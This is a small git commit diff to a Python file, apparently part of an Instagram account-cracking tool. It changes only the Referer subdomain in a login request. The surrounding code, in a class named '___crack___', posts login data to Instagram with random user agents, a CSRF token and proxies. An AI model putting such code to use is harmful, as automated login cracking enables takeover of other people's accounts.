d474733ae7b6e55ffe1d0bc37465a0d1f7a98b6a
MN4WN1-777 <86679493+MN4WN1-777@users.noreply.github.com>
2022-08-08 02:47:13 +0700

    Update jk.py

--- jk.py
+++ jk.py
@@ -432,7 +432,7 @@ class ___crack___:
                 'optIntoOneTap': 'false'}
                 ___head = {'User-Agent': random.choice(open("Data/ua.txt","r").read().splitlines()),
                 'X-Requested-With': 'XMLHttpRequest',
-                'Referer': 'https://z-p15.www.instagram.com/accounts/login/',
+                'Referer': 'https://z-p42.www.instagram.com/accounts/login/',
                 'x-csrftoken': ___csrf}
                 with requests.Session() as ses:
                     response = ses.post(___login, data = ___data, headers = ___head, proxies = ___proxy).json()
